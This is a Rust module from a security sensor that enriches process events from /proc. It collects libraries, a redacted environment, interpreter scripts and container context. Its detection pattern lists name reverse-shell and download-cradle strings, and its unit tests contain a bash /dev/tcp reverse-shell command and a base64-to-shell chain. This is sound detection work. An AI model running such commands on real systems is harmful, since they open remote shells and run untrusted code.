//! Process-enrichment helpers shared by the exec/syscall collectors.
//!
//! These functions add the "telemetry depth" a Falcon-class sensor is expected
//! to carry on every process event, all sourced from `/proc` (no eBPF program
//! change required):
//!
//! The executable image hash (the IOC/reputation key) is produced by the shared,
//! cached [`super::exehash`] and filled in by the caller; this module adds the
//! complementary depth:
//!
//!   * **Loaded-library inventory** — the shared objects mapped into the process
//!     image (the Linux "loaded module" list, the DLL-equivalent), parsed from
//!     `/proc/<pid>/maps`.
//!   * **Environment** — a curated, secret-redacted view of the process
//!     environment (`LD_PRELOAD`, `LD_LIBRARY_PATH`, proxies, SSH/K8s context …).
//!   * **Interpreter script content** — the inline script of `python -c`,
//!     `bash -c`, `perl -e`, … plus any base64 blobs decoded out of the command
//!     line (the classic `… | base64 -d | sh` obfuscation chain).
//!   * **Container / Kubernetes context** — runtime, container id and (best
//!     effort) the pod uid / name / namespace, parsed from the cgroup and the
//!     process environment.
//!
//! Every helper is best-effort and never panics: a process that already exited,
//! an unreadable `/proc` node or a binary too large to hash degrades to
//! `None` / an empty collection rather than failing the event.

use std::collections::BTreeMap;

use crate::schema::{ExecEnrichment, InterpreterContext, K8sContext};

// The executable image hash is produced by the shared, cached
// `super::exehash::hash_executable` (it also feeds IOC matching + IOA lineage),
// so this module deliberately does not hash — it adds the *other* depth fields.

// ── Tunables ──────────────────────────────────────────────────────────────────

/// Maximum shared libraries reported per process (deduplicated).
const MAX_LIBS: usize = 128;

/// Maximum captured length of an inline interpreter script / decoded payload.
const MAX_SCRIPT_LEN: usize = 4096;

/// Environment values longer than this are truncated (with an ellipsis marker).
const MAX_ENV_VAL: usize = 512;

// ── Loaded-library inventory ──────────────────────────────────────────────────

/// Shared objects mapped into the process image, parsed from `/proc/<pid>/maps`.
///
/// Returns absolute paths of every distinct `*.so` / `*.so.N` backing file,
/// sorted and deduplicated, capped at [`MAX_LIBS`]. Best-effort: an empty list
/// just means the process exited or had no file-backed mappings yet.
pub fn loaded_libraries(pid: u32) -> Vec<String> {
    let maps = match std::fs::read_to_string(format!("/proc/{pid}/maps")) {
        Ok(m) => m,
        Err(_) => return Vec::new(),
    };
    let mut libs = std::collections::BTreeSet::new();
    for line in maps.lines() {
        // Format: addr perms offset dev inode  pathname
        // The pathname is everything after the inode column; only file-backed
        // mappings have one. Take it from the first '/'.
        let Some(slash) = line.find('/') else {
            continue;
        };
        let path = line[slash..].trim();
        if is_shared_object(path) {
            libs.insert(path.to_string());
            if libs.len() >= MAX_LIBS {
                break;
            }
        }
    }
    libs.into_iter().collect()
}

/// True for a shared-object backing file (`libc.so.6`, `foo.so`), excluding the
/// special bracketed regions (`[heap]`, `[stack]`, `[vdso]`) and `(deleted)`
/// markers that share the maps column.
fn is_shared_object(path: &str) -> bool {
    if !path.starts_with('/') {
        return false;
    }
    let name = path.rsplit('/').next().unwrap_or(path);
    name.ends_with(".so") || name.contains(".so.")
}

// ── Environment (curated + redacted) ────────────────────────────────────────────

/// Environment variable names that are always interesting for security
/// analysis (loader hijacking, proxy pivoting, SSH/K8s session context).
const ENV_ALLOWLIST: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "LD_BIND_NOW",
    "PATH",
    "PYTHONPATH",
    "PYTHONSTARTUP",
    "PERL5LIB",
    "NODE_OPTIONS",
    "SHELL",
    "TERM",
    "SUDO_USER",
    "SUDO_UID",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
    "NO_PROXY",
    "SSH_CONNECTION",
    "SSH_CLIENT",
    "SSH_TTY",
    "SSH_AUTH_SOCK",
    "KUBERNETES_SERVICE_HOST",
    "KUBERNETES_PORT",
    "container",
    "HOSTNAME",
];

/// Substrings that mark a variable name as a secret — its value is redacted but
/// its presence is still reported (an attacker leaking a `*_TOKEN` is signal).
const SECRET_MARKERS: &[&str] = &[
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "APIKEY",
    "API_KEY",
    "KEY",
    "CREDENTIAL",
];

/// Capture the curated environment of a process from `/proc/<pid>/environ`.
///
/// Only [`ENV_ALLOWLIST`] names are returned; values whose name matches a
/// [`SECRET_MARKERS`] substring are replaced with `***redacted***` so the
/// telemetry never exfiltrates live credentials. Returned map is empty when the
/// process exited or `environ` was unreadable (it is root-readable only).
pub fn curated_env(pid: u32) -> BTreeMap<String, String> {
    let raw = match std::fs::read(format!("/proc/{pid}/environ")) {
        Ok(b) => b,
        Err(_) => return BTreeMap::new(),
    };
    let mut out = BTreeMap::new();
    for kv in raw.split(|&b| b == 0) {
        if kv.is_empty() {
            continue;
        }
        let Ok(s) = std::str::from_utf8(kv) else {
            continue;
        };
        let Some((k, v)) = s.split_once('=') else {
            continue;
        };
        if !ENV_ALLOWLIST.contains(&k) {
            continue;
        }
        out.insert(k.to_string(), sanitize_env_value(k, v));
    }
    out
}

fn sanitize_env_value(key: &str, value: &str) -> String {
    let upper = key.to_ascii_uppercase();
    if SECRET_MARKERS.iter().any(|m| upper.contains(m)) {
        return "***redacted***".to_string();
    }
    truncate(value, MAX_ENV_VAL)
}

// ── Interpreter script content / obfuscation chains ─────────────────────────────

/// Recognise a script interpreter from its `comm`/`exe` basename.
fn interpreter_lang(comm: &str, exe: &str) -> Option<&'static str> {
    let base = exe
        .rsplit('/')
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or(comm);
    // Strip a trailing version suffix (python3.11 → python3 → python).
    let langs: &[(&str, &str)] = &[
        ("python", "python"),
        ("perl", "perl"),
        ("ruby", "ruby"),
        ("node", "node"),
        ("php", "php"),
        ("pwsh", "powershell"),
        ("bash", "bash"),
        ("dash", "sh"),
        ("zsh", "zsh"),
        ("sh", "sh"),
    ];
    langs
        .iter()
        .find(|(needle, _)| base.starts_with(needle))
        .map(|(_, lang)| *lang)
}

/// Extract interpreter context (inline `-c`/`-e` script + decoded base64 blobs)
/// from a process's command line. Pure over its inputs and unit-tested.
pub fn interpreter_context(comm: &str, exe: &str, cmdline: &str) -> Option<InterpreterContext> {
    let lang = interpreter_lang(comm, exe)?;
    let inline_script = inline_script_arg(cmdline);
    let decoded_payloads = decode_base64_blobs(cmdline);
    let indicators = script_indicators(cmdline, &inline_script, &decoded_payloads);

    // Only emit when we actually learned something beyond "this is an interpreter".
    if inline_script.is_none() && decoded_payloads.is_empty() && indicators.is_empty() {
        return None;
    }
    Some(InterpreterContext {
        lang: lang.to_string(),
        inline_script,
        decoded_payloads,
        indicators,
    })
}

/// Pull the argument following `-c` / `-e` / `-E` (inline program flags shared by
/// python/perl/ruby/node/bash/sh). Returns the remainder of the command line
/// after the flag, which is the script body.
fn inline_script_arg(cmdline: &str) -> Option<String> {
    let toks: Vec<&str> = cmdline.split_whitespace().collect();
    for (i, tok) in toks.iter().enumerate() {
        if matches!(*tok, "-c" | "-e" | "-E") {
            if let Some(rest) = toks.get(i + 1..) {
                if !rest.is_empty() {
                    return Some(truncate(&rest.join(" "), MAX_SCRIPT_LEN));
                }
            }
        }
    }
    None
}

/// Find long base64-looking tokens in the command line and decode them to a
/// UTF-8 (lossy) preview. Catches the `echo <b64> | base64 -d | sh` family and
/// `python -c "...b64decode('...')..."` droppers.
fn decode_base64_blobs(cmdline: &str) -> Vec<String> {
    use base64::Engine as _;
    let mut out = Vec::new();
    for tok in
        cmdline.split(|c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '(' | ')' | ','))
    {
        let candidate = tok.trim_matches(|c| matches!(c, '\'' | '"' | '`'));
        if !looks_base64(candidate) {
            continue;
        }
        if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(candidate) {
            // Keep only payloads that decode to mostly-printable text — random
            // binary blobs are noise here.
            if let Some(text) = mostly_printable(&bytes) {
                out.push(truncate(&text, MAX_SCRIPT_LEN));
                if out.len() >= 8 {
                    break;
                }
            }
        }
    }
    out
}

/// Heuristic: a token long enough and built only from the base64 alphabet.
fn looks_base64(s: &str) -> bool {
    s.len() >= 16
        && s.len().is_multiple_of(4)
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
        // Require some alphabetic content so a long number isn't mistaken for b64.
        && s.bytes().any(|b| b.is_ascii_alphabetic())
}

/// Decode bytes to a string only when they are predominantly printable ASCII —
/// the signal we want is decoded *scripts*, not arbitrary binary.
fn mostly_printable(bytes: &[u8]) -> Option<String> {
    if bytes.is_empty() {
        return None;
    }
    let printable = bytes
        .iter()
        .filter(|&&b| b == b'\n' || b == b'\t' || (0x20..=0x7e).contains(&b))
        .count();
    if (printable as f64) / (bytes.len() as f64) >= 0.85 {
        Some(String::from_utf8_lossy(bytes).into_owned())
    } else {
        None
    }
}

/// Tag known-suspicious patterns in the command line / decoded content.
fn script_indicators(
    cmdline: &str,
    inline_script: &Option<String>,
    decoded: &[String],
) -> Vec<String> {
    let mut tags = Vec::new();
    let hay = format!(
        "{} {} {}",
        cmdline,
        inline_script.as_deref().unwrap_or(""),
        decoded.join(" ")
    )
    .to_ascii_lowercase();

    let patterns: &[(&str, &[&str])] = &[
        (
            "base64_decode",
            &[
                "base64 -d",
                "base64 --decode",
                "b64decode",
                "frombase64string",
            ],
        ),
        (
            "pipe_to_shell",
            &["| sh", "| bash", "|sh", "|bash", "curl", "wget"],
        ),
        (
            "reverse_shell",
            &[
                "/dev/tcp/",
                "socket.socket",
                "sh -i",
                "pty.spawn",
                "fsockopen",
            ],
        ),
        (
            "in_memory_exec",
            &[
                "memfd_create",
                "exec(",
                "eval(",
                "iex ",
                "invoke-expression",
            ],
        ),
        (
            "download_cradle",
            &["urllib", "requests.get", "downloadstring", "net.webclient"],
        ),
    ];
    for (tag, needles) in patterns {
        if needles.iter().any(|n| hay.contains(n)) {
            tags.push((*tag).to_string());
        }
    }
    tags
}

// ── Container / Kubernetes context ──────────────────────────────────────────────

/// Resolved container facts for a process.
#[derive(Default)]
pub struct ContainerFacts {
    pub container_id: Option<String>,
    pub runtime: Option<String>,
    pub image: Option<String>,
    pub image_digest: Option<String>,
    pub k8s: Option<K8sContext>,
}

/// Best-effort container + Kubernetes context for a process.
///
/// The container id + runtime + pod uid come from the cgroup; the image name /
/// digest and orchestration labels (pod name / namespace) are resolved from the
/// runtime state files (see [`super::container`]), falling back to the process
/// environment / downward API when the runtime metadata is unreadable.
pub fn container_context(pid: u32, env: &BTreeMap<String, String>) -> ContainerFacts {
    let cgroup = std::fs::read_to_string(format!("/proc/{pid}/cgroup")).unwrap_or_default();
    let (container_id, runtime, mut pod_uid) = parse_cgroup(&cgroup);

    // Enrich from the runtime state: image name/digest + k8s labels.
    let img = container_id
        .as_deref()
        .map(super::container::resolve)
        .unwrap_or_default();

    let (mut pod_name, mut namespace, label_uid) = super::container::k8s_labels(&img.labels);
    pod_uid = pod_uid.or(label_uid);

    // Env / downward-API fallbacks when labels are absent (non-root read, etc.).
    if pod_name.is_none() {
        pod_name = env.get("POD_NAME").or_else(|| env.get("HOSTNAME")).cloned();
    }
    if namespace.is_none() {
        namespace = env
            .get("POD_NAMESPACE")
            .or_else(|| env.get("KUBERNETES_NAMESPACE"))
            .cloned();
    }

    let in_k8s = pod_uid.is_some()
        || pod_name.is_some()
        || namespace.is_some()
        || env.contains_key("KUBERNETES_SERVICE_HOST")
        || img.labels.keys().any(|k| k.starts_with("io.kubernetes."));

    let k8s = in_k8s.then(|| K8sContext {
        pod_uid,
        pod_name,
        namespace,
        labels: img
            .labels
            .iter()
            .filter(|(k, _)| k.starts_with("io.kubernetes.") || !k.contains('.'))
            .map(|(k, v)| (k.clone(), v.clone()))
            .collect(),
    });

    ContainerFacts {
        container_id,
        runtime,
        image: img.image,
        image_digest: img.image_digest,
        k8s,
    }
}

/// Parse the cgroup file into `(container_id, runtime, pod_uid)`.
fn parse_cgroup(cgroup: &str) -> (Option<String>, Option<String>, Option<String>) {
    let mut container_id = None;
    let mut runtime = None;
    let mut pod_uid = None;

    for line in cgroup.lines() {
        let Some(path) = line.splitn(3, ':').nth(2) else {
            continue;
        };
        if path == "/" {
            continue;
        }

        if path.contains("kubepods") {
            runtime.get_or_insert_with(|| "kubepods".to_string());
            if let Some(uid) = extract_pod_uid(path) {
                pod_uid.get_or_insert(uid);
            }
        }

        for segment in path.split('/') {
            let (seg_runtime, candidate) = strip_runtime_prefix(segment);
            if let Some(r) = seg_runtime {
                runtime = Some(r.to_string());
            }
            if is_container_id(candidate) {
                container_id.get_or_insert_with(|| candidate.to_string());
            }
        }
    }
    (container_id, runtime, pod_uid)
}

/// Strip a runtime prefix from a cgroup segment, returning the detected runtime
/// (if any) and the bare candidate id.
fn strip_runtime_prefix(segment: &str) -> (Option<&'static str>, &str) {
    let s = segment.trim_end_matches(".scope");
    // Longest/most-specific prefixes first so `cri-containerd-` wins over a bare
    // `containerd-` match.
    for (prefix, runtime) in [
        ("cri-containerd-", "containerd"),
        ("docker-", "docker"),
        ("crio-", "crio"),
        ("containerd-", "containerd"),
        ("libpod-", "podman"),
    ] {
        if let Some(rest) = s.strip_prefix(prefix) {
            return (Some(runtime), rest);
        }
    }
    // Bare 64-hex segment under /docker/<id> etc. carries no prefix.
    (None, s)
}

/// A cgroup segment is a container id when it is a 12–64 char hex string.
fn is_container_id(candidate: &str) -> bool {
    (12..=64).contains(&candidate.len()) && candidate.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Pull the pod uid out of a kubepods cgroup path, e.g.
/// `…/kubepods-besteffort-pod1234_5678_….slice/…` (systemd driver, `_`-encoded)
/// or `…/podabcd-ef01-…/…` (cgroupfs driver, `-`-encoded).
///
/// Matches only a `pod` token on a separator boundary, so the `pod` inside
/// `kubepods` is not mistaken for the uid marker.
fn extract_pod_uid(path: &str) -> Option<String> {
    let bytes = path.as_bytes();
    let mut from = 0;
    while let Some(rel) = path[from..].find("pod") {
        let idx = from + rel;
        from = idx + 3;
        // "pod" must start a token (preceded by a separator or the string start).
        let on_boundary = idx == 0 || matches!(bytes[idx - 1], b'-' | b'/' | b'_' | b'.');
        if !on_boundary {
            continue;
        }
        let rest = &path[idx + 3..];
        let end = rest.find('/').unwrap_or(rest.len());
        let uid = rest[..end]
            .trim_end_matches(".slice")
            .trim_end_matches(".scope")
            .replace('_', "-");
        let hex_count = uid.bytes().filter(u8::is_ascii_hexdigit).count();
        if hex_count >= 32 && uid.bytes().all(|b| b.is_ascii_hexdigit() || b == b'-') {
            return Some(uid);
        }
    }
    None
}

// ── Top-level enrichment ─────────────────────────────────────────────────────────

/// Build the full [`ExecEnrichment`] for a freshly-exec'd process. All fields
/// are best-effort; a process that already exited yields an enrichment with the
/// hash filled (from the event's exe path, if still present) and the rest empty.
pub fn enrich_exec(pid: u32, comm: &str, exe: &str, cmdline: &str) -> ExecEnrichment {
    let env = curated_env(pid);
    let c = container_context(pid, &env);
    ExecEnrichment {
        // The image hash is filled by the caller from the shared exehash cache.
        loaded_libraries: loaded_libraries(pid),
        interpreter: interpreter_context(comm, exe, cmdline),
        env,
        container_id: c.container_id,
        container_runtime: c.runtime,
        container_image: c.image,
        container_image_digest: c.image_digest,
        k8s: c.k8s,
    }
}

// ── Small helpers ──────────────────────────────────────────────────────────────

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        // Respect char boundaries when cutting.
        let mut end = max;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        format!("{}…", &s[..end])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_shared_objects() {
        assert!(is_shared_object("/usr/lib/x86_64-linux-gnu/libc.so.6"));
        assert!(is_shared_object("/lib/ld-linux.so.2"));
        assert!(is_shared_object("/opt/app/plugin.so"));
        assert!(!is_shared_object("/usr/bin/python3"));
        assert!(!is_shared_object("[heap]"));
        assert!(!is_shared_object("/memfd:foo (deleted)"));
    }

    #[test]
    fn container_id_recognition() {
        assert!(is_container_id("0123456789ab"));
        assert!(is_container_id(&"a".repeat(64)));
        assert!(!is_container_id("short"));
        assert!(!is_container_id("not-hex-zzzz"));
    }

    #[test]
    fn strips_runtime_prefixes() {
        assert_eq!(
            strip_runtime_prefix("docker-abc123.scope"),
            (Some("docker"), "abc123")
        );
        assert_eq!(
            strip_runtime_prefix("crio-deadbeef.scope"),
            (Some("crio"), "deadbeef")
        );
        assert_eq!(
            strip_runtime_prefix("libpod-ff00.scope"),
            (Some("podman"), "ff00")
        );
        assert_eq!(strip_runtime_prefix("abcdef").0, None);
    }

    #[test]
    fn parses_docker_cgroup() {
        let cg = "0::/system.slice/docker-3b9c2f4e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d.scope";
        let (id, runtime, pod) = parse_cgroup(cg);
        assert_eq!(runtime.as_deref(), Some("docker"));
        assert_eq!(
            id.as_deref(),
            Some("3b9c2f4e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d")
        );
        assert!(pod.is_none());
    }

    #[test]
    fn parses_kubepods_cgroup() {
        let cg = "0::/kubepods.slice/kubepods-besteffort.slice/\
                  kubepods-besteffort-pod1234abcd_5678_ef01_2345_6789abcdef01.slice/\
                  cri-containerd-aabbccddeeff00112233445566778899aabbccddeeff001122334455667788.scope";
        let (id, runtime, pod) = parse_cgroup(cg);
        // kubepods marks the runtime; the container id is the cri-containerd hash.
        assert!(runtime.is_some());
        assert!(id.is_some());
        assert_eq!(pod.as_deref(), Some("1234abcd-5678-ef01-2345-6789abcdef01"));
    }

    #[test]
    fn extracts_inline_python_script() {
        let i = interpreter_context(
            "python3",
            "/usr/bin/python3",
            "/usr/bin/python3 -c import os; os.system('id')",
        )
        .unwrap();
        assert_eq!(i.lang, "python");
        assert_eq!(
            i.inline_script.as_deref(),
            Some("import os; os.system('id')")
        );
    }

    #[test]
    fn flags_reverse_shell_bash() {
        let i = interpreter_context(
            "bash",
            "/bin/bash",
            "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        )
        .unwrap();
        assert_eq!(i.lang, "bash");
        assert!(i.indicators.contains(&"reverse_shell".to_string()));
    }

    #[test]
    fn decodes_base64_payload() {
        use base64::Engine as _;
        let payload = "echo hello world from a decoded script";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
        let cmdline = format!("bash -c echo {b64} | base64 -d | sh");
        let i = interpreter_context("bash", "/bin/bash", &cmdline).unwrap();
        assert!(
            i.decoded_payloads
                .iter()
                .any(|p| p.contains("decoded script")),
            "expected decoded payload, got {:?}",
            i.decoded_payloads
        );
        assert!(i.indicators.contains(&"base64_decode".to_string()));
        assert!(i.indicators.contains(&"pipe_to_shell".to_string()));
    }

    #[test]
    fn non_interpreter_yields_none() {
        assert!(interpreter_context("ls", "/bin/ls", "ls -la /tmp").is_none());
    }

    #[test]
    fn redacts_secret_env_values() {
        assert_eq!(
            sanitize_env_value("AWS_SECRET_ACCESS_KEY", "abc123"),
            "***redacted***"
        );
        assert_eq!(sanitize_env_value("API_TOKEN", "xyz"), "***redacted***");
        assert_eq!(sanitize_env_value("PATH", "/usr/bin"), "/usr/bin");
    }

    #[test]
    fn truncate_respects_char_boundaries() {
        let s = "ααααα"; // 2 bytes per char
        let t = truncate(s, 5);
        assert!(t.ends_with('…'));
        // Must not panic and must be valid UTF-8 (implicit by String).
        assert!(t.len() <= s.len() + 3);
    }
}
